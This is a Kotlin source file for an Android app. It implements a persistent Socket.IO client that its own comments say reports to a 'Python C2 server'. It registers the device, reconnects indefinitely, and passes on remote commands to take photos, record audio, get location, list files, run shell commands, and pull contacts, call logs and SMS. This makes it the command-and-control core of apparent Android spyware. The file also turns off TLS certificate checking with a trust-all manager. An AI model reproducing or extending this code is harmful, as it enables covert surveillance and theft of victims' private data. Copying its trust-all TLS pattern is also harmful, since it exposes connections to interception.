// android/app/src/main/kotlin/com/example/kem/NativeSocketIOClient.kt
package com.example.kem

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import org.json.JSONArray
import java.io.*
import java.net.*
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import javax.net.ssl.*
import kotlin.random.Random

/**
 * ✅ ENHANCED: Native Socket.IO client specifically designed for Python Flask-SocketIO
 * Includes proper message handling, reconnection logic, and command processing
 */
class NativeSocketIOClient(
    private val context: Context,
    private val commandCallback: CommandCallback? = null
) {
    companion object {
        private const val TAG = "NativeSocketIOClient"
        private const val RECONNECT_DELAY_MS = 5000L
        private const val MAX_RECONNECT_ATTEMPTS = 100 // Increased for better persistence
        private const val HEARTBEAT_INTERVAL_MS = 25000L // 25 seconds for Python server
        private const val CONNECTION_TIMEOUT_MS = 30000L
        private const val MESSAGE_QUEUE_MAX_SIZE = 200
        
        // ✅ FIXED: Socket.IO protocol constants for Python Flask-SocketIO
        private const val ENGINE_IO_OPEN = "0"
        private const val ENGINE_IO_CLOSE = "1"
        private const val ENGINE_IO_PING = "2"
        private const val ENGINE_IO_PONG = "3"
        private const val ENGINE_IO_MESSAGE = "4"
        private const val ENGINE_IO_UPGRADE = "5"
        private const val ENGINE_IO_NOOP = "6"
        
        private const val SOCKET_IO_CONNECT = "0"
        private const val SOCKET_IO_DISCONNECT = "1"
        private const val SOCKET_IO_EVENT = "2"
        private const val SOCKET_IO_ACK = "3"
        private const val SOCKET_IO_ERROR = "4"
        private const val SOCKET_IO_BINARY_EVENT = "5"
        private const val SOCKET_IO_BINARY_ACK = "6"
    }
    
    interface CommandCallback {
        fun onCommandReceived(command: String, args: JSONObject)
        fun onConnectionStatusChanged(connected: Boolean)
        fun onError(error: String)
    }
    
    // ✅ ENHANCED: Connection state management
    private var webSocket: SimpleWebSocket? = null
    private val isConnected = AtomicBoolean(false)
    private val isConnecting = AtomicBoolean(false)
    private var reconnectAttempts = 0
    private var sessionId: String? = null
    private var deviceId: String = ""
    private var serverUrl: String = ""
    private var lastSuccessfulConnection = 0L
    
    // ✅ ENHANCED: Coroutine management with proper supervision
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var heartbeatJob: Job? = null
    private var reconnectJob: Job? = null
    private var connectionTimeoutJob: Job? = null
    
    // ✅ ENHANCED: Configuration and persistence
    private val prefs: SharedPreferences = context.getSharedPreferences("native_socketio", Context.MODE_PRIVATE)
    private val eventHandlers = ConcurrentHashMap<String, (JSONObject) -> Unit>()
    
    // ✅ ENHANCED: Message queue for offline scenarios
    private val messageQueue = Collections.synchronizedList(mutableListOf<QueuedMessage>())
    private val connectionHistory = mutableListOf<ConnectionAttempt>()
    
    data class QueuedMessage(
        val event: String,
        val data: JSONObject,
        val timestamp: Long = System.currentTimeMillis(),
        val priority: Int = 0 // Higher numbers = higher priority
    )
    
    data class ConnectionAttempt(
        val timestamp: Long,
        val success: Boolean,
        val error: String? = null
    )
    
    fun initialize(serverUrl: String, deviceId: String) {
        // ✅ FIXED: Keep HTTP protocol for Python Flask-SocketIO
        this.serverUrl = serverUrl.removeSuffix("/")
        this.deviceId = deviceId
        
        Log.d(TAG, "Initializing native Socket.IO client for Python Flask-SocketIO server")
        Log.d(TAG, "Server URL: $serverUrl")
        Log.d(TAG, "Device ID: $deviceId")
        
        // ✅ Load connection history
        loadConnectionHistory()
        
        setupEventHandlers()
        
        // ✅ Auto-connect after initialization
        scope.launch {
            delay(1000) // Brief delay to ensure everything is set up
            connect()
        }
    }
    
    private fun loadConnectionHistory() {
        try {
            val historyString = prefs.getString("connection_history", "")
            if (!historyString.isNullOrEmpty()) {
                val parts = historyString.split("|")
                parts.forEach { part ->
                    val components = part.split(",")
                    if (components.size >= 2) {
                        connectionHistory.add(
                            ConnectionAttempt(
                                timestamp = components[0].toLongOrNull() ?: 0,
                                success = components[1].toBoolean(),
                                error = if (components.size > 2) components[2] else null
                            )
                        )
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error loading connection history", e)
        }
    }
    
    private fun saveConnectionAttempt(success: Boolean, error: String? = null) {
        try {
            connectionHistory.add(ConnectionAttempt(System.currentTimeMillis(), success, error))
            
            // Keep only last 50 attempts
            if (connectionHistory.size > 50) {
                connectionHistory.removeAt(0)
            }
            
            val historyString = connectionHistory.joinToString("|") { attempt ->
                "${attempt.timestamp},${attempt.success}${if (attempt.error != null) ",${attempt.error}" else ""}"
            }
            
            prefs.edit().putString("connection_history", historyString).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error saving connection attempt", e)
        }
    }
    
    private fun setupEventHandlers() {
        // ✅ ENHANCED: Handle device registration responses
        on("registration_successful") { data ->
            Log.d(TAG, "Device registration successful with Python server: $data")
            commandCallback?.onConnectionStatusChanged(true)
            lastSuccessfulConnection = System.currentTimeMillis()
            reconnectAttempts = 0 // Reset on successful registration
        }
        
        on("registration_failed") { data ->
            Log.e(TAG, "Device registration failed with Python server: $data")
            commandCallback?.onError("Registration failed: $data")
        }
        
        on("request_registration_info") { _ ->
            Log.d(TAG, "Python server requesting registration info")
            scope.launch { registerDevice() }
        }
        
        // ✅ ENHANCED: Handle incoming commands from Python C2 server
        on("command_take_picture") { args ->
            Log.d(TAG, "Received take picture command from Python server: $args")
            commandCallback?.onCommandReceived("command_take_picture", args)
        }
        
        on("command_record_voice") { args ->
            Log.d(TAG, "Received record voice command from Python server: $args")
            commandCallback?.onCommandReceived("command_record_voice", args)
        }
        
        on("command_get_location") { args ->
            Log.d(TAG, "Received get location command from Python server: $args")
            commandCallback?.onCommandReceived("command_get_location", args)
        }
        
        on("command_list_files") { args ->
            Log.d(TAG, "Received list files command from Python server: $args")
            commandCallback?.onCommandReceived("command_list_files", args)
        }
        
        on("command_execute_shell") { args ->
            Log.d(TAG, "Received execute shell command from Python server: $args")
            commandCallback?.onCommandReceived("command_execute_shell", args)
        }
        
        on("command_get_contacts") { args ->
            Log.d(TAG, "Received get contacts command from Python server: $args")
            commandCallback?.onCommandReceived("command_get_contacts", args)
        }
        
        on("command_get_call_logs") { args ->
            Log.d(TAG, "Received get call logs command from Python server: $args")
            commandCallback?.onCommandReceived("command_get_call_logs", args)
        }
        
        on("command_get_sms") { args ->
            Log.d(TAG, "Received get SMS command from Python server: $args")
            commandCallback?.onCommandReceived("command_get_sms", args)
        }
        
        // ✅ ENHANCED: Handle server-side events
        on("server_message") { data ->
            Log.d(TAG, "Received server message from Python: $data")
        }
        
        on("disconnect") { data ->
            Log.d(TAG, "Server requested disconnect: $data")
            handleDisconnection()
        }
    }
    
    fun connect() {
        if (isConnecting.get() || isConnected.get()) {
            Log.d(TAG, "Already connecting or connected to Python server")
            return
        }
        
        if (serverUrl.isEmpty() || deviceId.isEmpty()) {
            Log.e(TAG, "Server URL or device ID not set")
            commandCallback?.onError("Configuration error: Server URL or device ID missing")
            return
        }
        
        scope.launch {
            connectInternal()
        }
    }
    
    private suspend fun connectInternal() {
        isConnecting.set(true)
        
        try {
            Log.d(TAG, "Attempting to connect to Python Flask-SocketIO server: $serverUrl")
            
            // ✅ Start connection timeout
            startConnectionTimeout()
            
            // ✅ FIXED: Correct Socket.IO handshake for Python server
            val socketUrl = buildPythonSocketIOUrl()
            Log.d(TAG, "Full Socket.IO URL: $socketUrl")
            
            webSocket = createWebSocket(socketUrl)
            
        } catch (e: Exception) {
            Log.e(TAG, "Connection failed to Python server", e)
            isConnecting.set(false)
            saveConnectionAttempt(false, e.message)
            scheduleReconnect()
        }
    }
    
    private fun startConnectionTimeout() {
        connectionTimeoutJob?.cancel()
        connectionTimeoutJob = scope.launch {
            delay(CONNECTION_TIMEOUT_MS)
            if (isConnecting.get() && !isConnected.get()) {
                Log.w(TAG, "Connection timeout to Python server")
                handleDisconnection()
                commandCallback?.onError("Connection timeout to Python server")
            }
        }
    }
    
    private fun buildPythonSocketIOUrl(): String {
        // ✅ FIXED: Python Flask-SocketIO specific URL format
        val baseUrl = serverUrl
        
        // Convert HTTP to WebSocket URL for Python Flask-SocketIO
        val wsUrl = when {
            baseUrl.startsWith("https://") -> baseUrl.replace("https://", "wss://")
            baseUrl.startsWith("http://") -> baseUrl.replace("http://", "ws://")
            else -> "ws://$baseUrl"
        }
        
        // ✅ Python Flask-SocketIO expects specific parameters
        return "$wsUrl/socket.io/?EIO=4&transport=websocket&deviceId=$deviceId"
    }
    
    private fun createWebSocket(url: String): SimpleWebSocket {
        return SimpleWebSocket(url, object : SimpleWebSocket.WebSocketListener {
            override fun onOpen() {
                Log.d(TAG, "WebSocket connection opened to Python Flask-SocketIO server")
                connectionTimeoutJob?.cancel()
                isConnecting.set(false)
                isConnected.set(true)
                reconnectAttempts = 0
                
                saveConnectionAttempt(true)
                
                // ✅ Send Socket.IO connection handshake to Python server
                sendSocketIOConnect()
                startHeartbeat()
                
                // ✅ Process any queued messages
                scope.launch { processMessageQueue() }
                
                Log.d(TAG, "Successfully connected to Python server - starting registration")
            }
            
            override fun onMessage(message: String) {
                scope.launch { handlePythonMessage(message) }
            }
            
            override fun onClose(code: Int, reason: String) {
                Log.d(TAG, "WebSocket closed by Python server: $code - $reason")
                saveConnectionAttempt(false, "Closed: $code - $reason")
                handleDisconnection()
            }
            
            override fun onError(error: Exception) {
                Log.e(TAG, "WebSocket error with Python server", error)
                saveConnectionAttempt(false, "Error: ${error.message}")
                handleDisconnection()
                commandCallback?.onError("WebSocket error: ${error.message}")
            }
        })
    }
    
    private suspend fun handlePythonMessage(message: String) {
        try {
            Log.d(TAG, "Received from Python server: $message")
            
            if (message.isEmpty()) return
            
            // ✅ FIXED: Handle Python Flask-SocketIO message format
            val engineType = message.substring(0, 1)
            val payload = if (message.length > 1) message.substring(1) else ""
            
            when (engineType) {
                ENGINE_IO_OPEN -> {
                    Log.d(TAG, "Engine.IO connection opened by Python server")
                    handleEngineIOOpen(payload)
                }
                ENGINE_IO_MESSAGE -> handleSocketIOMessage(payload)
                ENGINE_IO_PING -> {
                    Log.d(TAG, "Received ping from Python server")
                    sendPong()
                }
                ENGINE_IO_PONG -> {
                    Log.d(TAG, "Received pong from Python server")
                }
                ENGINE_IO_CLOSE -> {
                    Log.d(TAG, "Python server requested close")
                    disconnect()
                }
                else -> Log.d(TAG, "Unhandled Engine.IO message type from Python server: $engineType")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling Python server message: $message", e)
        }
    }
    
    private fun handleEngineIOOpen(payload: String) {
        try {
            if (payload.isNotEmpty()) {
                val openData = JSONObject(payload)
                sessionId = openData.optString("sid")
                val pingInterval = openData.optInt("pingInterval", 25000)
                val pingTimeout = openData.optInt("pingTimeout", 5000)
                
                Log.d(TAG, "Python server session ID: $sessionId")
                Log.d(TAG, "Python server ping interval: ${pingInterval}ms")
                
                // ✅ Adjust heartbeat based on server settings
                if (pingInterval > 0) {
                    restartHeartbeatWithInterval(pingInterval.toLong())
                }
            }
            
            // ✅ Send Socket.IO connect after Engine.IO open
            sendSocketIOConnect()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error handling Engine.IO open from Python server", e)
        }
    }
    
    private suspend fun handleSocketIOMessage(payload: String) {
        if (payload.isEmpty()) return
        
        val socketType = payload.substring(0, 1)
        val data = if (payload.length > 1) payload.substring(1) else ""
        
        when (socketType) {
            SOCKET_IO_CONNECT -> {
                Log.d(TAG, "Socket.IO connected to Python server")
                // ✅ Extract session info if present
                if (data.isNotEmpty()) {
                    try {
                        val connectData = JSONObject(data)
                        sessionId = connectData.optString("sid", sessionId)
                        Log.d(TAG, "Python server Socket.IO session: $sessionId")
                    } catch (e: Exception) {
                        Log.w(TAG, "Could not parse Socket.IO connect data from Python server", e)
                    }
                }
                
                // ✅ Register device with Python server
                registerDevice()
            }
            
            SOCKET_IO_EVENT -> handlePythonEvent(data)
            
            SOCKET_IO_DISCONNECT -> {
                Log.d(TAG, "Socket.IO disconnected from Python server")
                handleDisconnection()
            }
            
            SOCKET_IO_ERROR -> {
                Log.e(TAG, "Socket.IO error from Python server: $data")
                commandCallback?.onError("Socket.IO error from Python server: $data")
            }
            
            else -> Log.d(TAG, "Unhandled Socket.IO message type from Python server: $socketType")
        }
    }
    
    private fun handlePythonEvent(data: String) {
        try {
            if (data.startsWith("[")) {
                val eventArray = JSONArray(data)
                if (eventArray.length() >= 1) {
                    val eventName = eventArray.getString(0)
                    val eventData = when {
                        eventArray.length() > 1 -> {
                            val rawData = eventArray.get(1)
                            when (rawData) {
                                is JSONObject -> rawData
                                is String -> JSONObject().put("message", rawData)
                                is Number -> JSONObject().put("value", rawData)
                                is Boolean -> JSONObject().put("flag", rawData)
                                else -> JSONObject().put("data", rawData.toString())
                            }
                        }
                        else -> JSONObject()
                    }
                    
                    Log.d(TAG, "Received Python event: $eventName with data: $eventData")
                    
                    // ✅ Route to appropriate handler
                    eventHandlers[eventName]?.invoke(eventData)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing Python event data: $data", e)
        }
    }
    
    private fun sendSocketIOConnect() {
        // ✅ Send Socket.IO connection message to Python server
        val connectMessage = "${ENGINE_IO_MESSAGE}${SOCKET_IO_CONNECT}"
        sendRaw(connectMessage)
    }
    
    private fun sendPong() {
        sendRaw(ENGINE_IO_PONG)
    }
    
    private suspend fun registerDevice() {
        try {
            Log.d(TAG, "Registering device with Python Flask-SocketIO server")
            
            val deviceInfo = JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", getDeviceName())
                put("platform", "android")
                put("timestamp", System.currentTimeMillis())
                put("nativeClient", true)
                put("clientVersion", "2.0.0")
                put("sessionId", sessionId ?: "unknown")
                put("lastConnection", lastSuccessfulConnection)
                put("reconnectAttempts", reconnectAttempts)
            }
            
            emit("register_device", deviceInfo)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error registering device with Python server", e)
        }
    }
    
    fun emit(event: String, data: JSONObject = JSONObject()) {
        if (!isConnected.get()) {
            Log.w(TAG, "Not connected to Python server, queueing message: $event")
            queueMessage(event, data, priority = if (event == "register_device") 10 else 1)
            return
        }
        
        scope.launch {
            try {
                // ✅ FIXED: Correct Socket.IO event format for Python server
                val eventArray = JSONArray().apply {
                    put(event)
                    put(data)
                }
                
                val message = "${ENGINE_IO_MESSAGE}${SOCKET_IO_EVENT}${eventArray}"
                sendRaw(message)
                
                Log.d(TAG, "Sent event to Python server: $event")
                
            } catch (e: Exception) {
                Log.e(TAG, "Error sending event to Python server: $event", e)
                queueMessage(event, data)
            }
        }
    }
    
    fun sendCommandResponse(originalCommand: String, status: String, payload: JSONObject) {
        val response = JSONObject().apply {
            put("command", originalCommand)
            put("status", status)
            put("payload", payload)
            put("timestamp_response_utc", System.currentTimeMillis())
            put("deviceId", deviceId)
            put("sessionId", sessionId ?: "unknown")
        }
        
        emit("command_response", response)
        Log.d(TAG, "Sent command response to Python server: $originalCommand - $status")
    }
    
    fun sendHeartbeat() {
        if (!isConnected.get()) return
        
        try {
            // ✅ Send both Socket.IO heartbeat and Engine.IO ping
            val heartbeat = JSONObject().apply {
                put("deviceId", deviceId)
                put("timestamp", System.currentTimeMillis())
                put("nativeClient", true)
                put("sessionId", sessionId ?: "unknown")
                put("uptime", System.currentTimeMillis() - lastSuccessfulConnection)
            }
            
            emit("device_heartbeat", heartbeat)
            sendRaw(ENGINE_IO_PING) // Engine.IO ping
            
        } catch (e: Exception) {
            Log.e(TAG, "Error sending heartbeat to Python server", e)
        }
    }
    
    private fun queueMessage(event: String, data: JSONObject, priority: Int = 1) {
        synchronized(messageQueue) {
            if (messageQueue.size >= MESSAGE_QUEUE_MAX_SIZE) {
                // Remove oldest low-priority message
                val oldestLowPriority = messageQueue.minByOrNull { if (it.priority <= 1) it.timestamp else Long.MAX_VALUE }
                if (oldestLowPriority != null) {
                    messageQueue.remove(oldestLowPriority)
                } else {
                    messageQueue.removeAt(0) // Remove oldest if all are high priority
                }
            }
            messageQueue.add(QueuedMessage(event, data, priority = priority))
            messageQueue.sortByDescending { it.priority } // Keep high priority messages first
        }
    }
    
    private suspend fun processMessageQueue() {
        synchronized(messageQueue) {
            val iterator = messageQueue.iterator()
            while (iterator.hasNext()) {
                val queuedMessage = iterator.next()
                
                // ✅ Skip messages older than 10 minutes unless high priority
                val messageAge = System.currentTimeMillis() - queuedMessage.timestamp
                if (messageAge > 600000 && queuedMessage.priority < 5) {
                    iterator.remove()
                    continue
                }
                
                emit(queuedMessage.event, queuedMessage.data)
                iterator.remove()
                
                // ✅ Brief delay to avoid overwhelming the Python server
                delay(100)
            }
        }
        
        Log.d(TAG, "Processed queued messages for Python server")
    }
    
    private fun sendRaw(message: String) {
        try {
            webSocket?.send(message)
        } catch (e: Exception) {
            Log.e(TAG, "Error sending raw message to Python server", e)
        }
    }
    
    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isConnected.get()) {
                sendHeartbeat()
                delay(HEARTBEAT_INTERVAL_MS)
            }
        }
        Log.d(TAG, "Heartbeat started for Python server (${HEARTBEAT_INTERVAL_MS}ms interval)")
    }
    
    private fun restartHeartbeatWithInterval(intervalMs: Long) {
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isConnected.get()) {
                sendHeartbeat()
                delay(intervalMs)
            }
        }
        Log.d(TAG, "Heartbeat restarted for Python server (${intervalMs}ms interval)")
    }
    
    private fun stopHeartbeat() {
        heartbeatJob?.cancel()
        Log.d(TAG, "Heartbeat stopped")
    }
    
    private fun handleDisconnection() {
        isConnected.set(false)
        isConnecting.set(false)
        sessionId = null
        
        connectionTimeoutJob?.cancel()
        stopHeartbeat()
        commandCallback?.onConnectionStatusChanged(false)
        
        scheduleReconnect()
    }
    
    private fun scheduleReconnect() {
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.w(TAG, "Max reconnection attempts reached for Python server, resetting counter")
            reconnectAttempts = 0
        }
        
        reconnectJob?.cancel()
        
        // ✅ ENHANCED: Exponential backoff with jitter
        val baseDelay = RECONNECT_DELAY_MS
        val exponentialDelay = baseDelay * (1 shl minOf(reconnectAttempts, 6)) // Cap at 2^6 = 64x
        val jitter = (Random.nextDouble() * 0.1 * exponentialDelay).toLong() // 10% jitter
        val finalDelay = minOf(exponentialDelay + jitter, 300000L) // Cap at 5 minutes
        
        reconnectAttempts++
        
        Log.d(TAG, "Scheduling reconnection to Python server attempt #$reconnectAttempts in ${finalDelay}ms")
        
        reconnectJob = scope.launch {
            delay(finalDelay)
            if (!isConnected.get()) {
                Log.d(TAG, "Attempting reconnection to Python server")
                connectInternal()
            }
        }
    }
    
    private fun on(event: String, handler: (JSONObject) -> Unit) {
        eventHandlers[event] = handler
    }
    
    private fun getDeviceName(): String {
        return try {
            "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}".trim()
        } catch (e: Exception) {
            "Unknown Android Device"
        }
    }
    
    fun isConnected(): Boolean = isConnected.get()
    
    fun getConnectionInfo(): Map<String, Any> {
        return mapOf(
            "connected" to isConnected.get(),
            "connecting" to isConnecting.get(),
            "sessionId" to (sessionId ?: "none"),
            "reconnectAttempts" to reconnectAttempts,
            "lastSuccessfulConnection" to lastSuccessfulConnection,
            "queuedMessages" to messageQueue.size,
            "serverUrl" to serverUrl,
            "deviceId" to deviceId
        )
    }
    
    fun disconnect() {
        Log.d(TAG, "Manually disconnecting from Python Flask-SocketIO server")
        
        isConnected.set(false)
        isConnecting.set(false)
        
        stopHeartbeat()
        reconnectJob?.cancel()
        connectionTimeoutJob?.cancel()
        
        try {
            // ✅ Send proper disconnect message to Python server
            sendRaw("${ENGINE_IO_MESSAGE}${SOCKET_IO_DISCONNECT}")
            Thread.sleep(100) // Brief delay to ensure message is sent
            
            webSocket?.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error closing WebSocket to Python server", e)
        }
        
        webSocket = null
        sessionId = null
    }
    
    fun destroy() {
        Log.d(TAG, "Destroying Socket.IO client for Python server")
        
        disconnect()
        scope.cancel()
        eventHandlers.clear()
        messageQueue.clear()
        
        // ✅ Save final state
        try {
            prefs.edit()
                .putLong("last_destruction", System.currentTimeMillis())
                .putInt("final_reconnect_attempts", reconnectAttempts)
                .apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error saving final state", e)
        }
    }
}

/**
 * ✅ ENHANCED: Simplified WebSocket implementation optimized for Python Flask-SocketIO
 * Handles SSL/TLS properly and includes better error handling
 */
class SimpleWebSocket(private val url: String, private val listener: WebSocketListener) {
    
    interface WebSocketListener {
        fun onOpen()
        fun onMessage(message: String)
        fun onClose(code: Int, reason: String)
        fun onError(error: Exception)
    }
    
    private var socket: Socket? = null
    private var writer: PrintWriter? = null
    private var reader: BufferedReader? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var isOpen = false
    private var isClosing = false
    
    companion object {
        private const val TAG = "SimpleWebSocket"
    }
    
    init {
        connect()
    }
    
    private fun connect() {
        scope.launch {
            try {
                val uri = URI(url)
                val host = uri.host
                val port = if (uri.port != -1) uri.port else if (uri.scheme == "wss") 443 else 80
                val isSecure = uri.scheme == "wss"
                
                Log.d(TAG, "Connecting to Python server: $host:$port (secure: $isSecure)")
                
                socket = if (isSecure) {
                    createSSLSocket(host, port)
                } else {
                    Socket().apply {
                        connect(InetSocketAddress(host, port), 30000) // 30s timeout
                    }
                }
                
                socket?.let { sock ->
                    writer = PrintWriter(OutputStreamWriter(sock.getOutputStream(), "UTF-8"), true)
                    reader = BufferedReader(InputStreamReader(sock.getInputStream(), "UTF-8"))
                    
                    performWebSocketHandshake(uri)
                    isOpen = true
                    listener.onOpen()
                    startReading()
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Connection failed to Python server", e)
                listener.onError(e)
            }
        }
    }
    
    private fun createSSLSocket(host: String, port: Int): Socket {
        // ✅ Create SSL context for secure connections
        val sslContext = SSLContext.getInstance("TLS")
        
        // ✅ For production, implement proper certificate validation
        // For testing/development, we'll accept all certificates
        sslContext.init(null, arrayOf(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        }), SecureRandom())
        
        val sslSocket = sslContext.socketFactory.createSocket(host, port) as SSLSocket
        sslSocket.soTimeout = 30000 // 30s timeout
        sslSocket.startHandshake()
        return sslSocket
    }
    
    private fun performWebSocketHandshake(uri: URI) {
        val key = Base64.getEncoder().encodeToString(ByteArray(16).apply { 
            Random.nextBytes(this) 
        })
        
        val path = uri.path + if (uri.query != null) "?${uri.query}" else ""
        
        // ✅ Send WebSocket handshake request
        writer?.println("GET $path HTTP/1.1")
        writer?.println("Host: ${uri.host}${if (uri.port != -1) ":${uri.port}" else ""}")
        writer?.println("Upgrade: websocket")
        writer?.println("Connection: Upgrade")
        writer?.println("Sec-WebSocket-Key: $key")
        writer?.println("Sec-WebSocket-Version: 13")
        writer?.println("Origin: http://${uri.host}")
        writer?.println("User-Agent: AndroidNativeClient/2.0")
        writer?.println()
        
        // ✅ Read and validate response
        val response = reader?.readLine()
        if (response?.contains("101") != true) {
            throw Exception("WebSocket handshake failed with Python server: $response")
        }
        
        // ✅ Skip headers until empty line
        while (reader?.readLine()?.isNotEmpty() == true) {
            // Skip header lines
        }
        
        Log.d(TAG, "WebSocket handshake successful with Python server")
    }
    
    private fun startReading() {
        scope.launch {
            try {
                while (isOpen && socket?.isConnected == true && !isClosing) {
                    val message = readFrame()
                    if (message != null) {
                        listener.onMessage(message)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Reading error from Python server", e)
                if (isOpen && !isClosing) {
                    listener.onError(e)
                }
            }
        }
    }
    
    fun send(message: String) {
        if (!isOpen || isClosing) {
            Log.w(TAG, "Cannot send message - WebSocket not open")
            return
        }
        
        scope.launch {
            try {
                sendFrame(message)
            } catch (e: Exception) {
                Log.e(TAG, "Send error to Python server", e)
                listener.onError(e)
            }
        }
    }
    
    private fun sendFrame(message: String) {
        val output = socket?.getOutputStream() ?: return
        val bytes = message.toByteArray(Charsets.UTF_8)
        
        // ✅ WebSocket frame format (masked client frame)
        output.write(0x81) // FIN + text frame
        
        when {
            bytes.size < 126 -> {
                output.write(bytes.size or 0x80) // MASK bit set
            }
            bytes.size < 65536 -> {
                output.write(126 or 0x80)
                output.write((bytes.size shr 8) and 0xFF)
                output.write(bytes.size and 0xFF)
            }
            else -> {
                output.write(127 or 0x80)
                for (i in 7 downTo 0) {
                    output.write((bytes.size.toLong() shr (8 * i)).toInt() and 0xFF)
                }
            }
        }
        
        // ✅ Masking key (required for client frames)
        val mask = ByteArray(4)
        Random.nextBytes(mask)
        output.write(mask)
        
        // ✅ Masked payload
        for (i in bytes.indices) {
            output.write(bytes[i].toInt() xor mask[i % 4].toInt())
        }
        
        output.flush()
    }
    
    private fun readFrame(): String? {
        val input = socket?.getInputStream() ?: return null
        
        val firstByte = input.read()
        if (firstByte == -1) return null
        
        val secondByte = input.read()
        if (secondByte == -1) return null
        
        val payloadLength = when (val len = secondByte and 0x7F) {
            126 -> {
                (input.read() shl 8) or input.read()
            }
            127 -> {
                // For simplicity, assume reasonable message sizes
                var length = 0L
                for (i in 0 until 8) {
                    length = (length shl 8) or input.read().toLong()
                }
                length.toInt()
            }
            else -> len
        }
        
        // ✅ Handle potential masking (server frames are usually unmasked)
        val masked = (secondByte and 0x80) != 0
        val maskingKey = if (masked) {
            ByteArray(4) { input.read().toByte() }
        } else null
        
        val payload = ByteArray(payloadLength)
        var bytesRead = 0
        while (bytesRead < payloadLength) {
            val read = input.read(payload, bytesRead, payloadLength - bytesRead)
            if (read == -1) break
            bytesRead += read
        }
        
        // ✅ Unmask if necessary
        if (masked && maskingKey != null) {
            for (i in payload.indices) {
                payload[i] = (payload[i].toInt() xor maskingKey[i % 4].toInt()).toByte()
            }
        }
        
        return String(payload, Charsets.UTF_8)
    }
    
    fun close() {
        try {
            isClosing = true
            isOpen = false
            socket?.close()
            listener.onClose(1000, "Normal closure")
        } catch (e: Exception) {
            Log.e(TAG, "Close error", e)
        }
    }
}